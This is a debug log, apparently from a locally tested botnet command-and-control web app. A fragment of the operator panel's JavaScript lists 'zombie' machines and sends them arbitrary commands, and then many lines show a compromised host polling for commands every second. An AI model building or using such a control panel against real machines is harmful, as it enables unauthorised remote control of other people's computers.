 zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 11:27:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:30] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-25 11:27:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:31 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:32 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:34 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:35 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:36 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:37 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:39 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:40 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:41 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:42 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:43 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:44 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:45 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:46 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:47 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:49 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:50 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:51 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:52 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:53 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:54 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:55 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:56 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:57 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:58 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:59 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:00 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:01 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:02 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:04 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:06 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:07 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:08 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:09 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:10 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:11 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:12 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:13 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:14 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:15 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:16 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:17 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:18 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
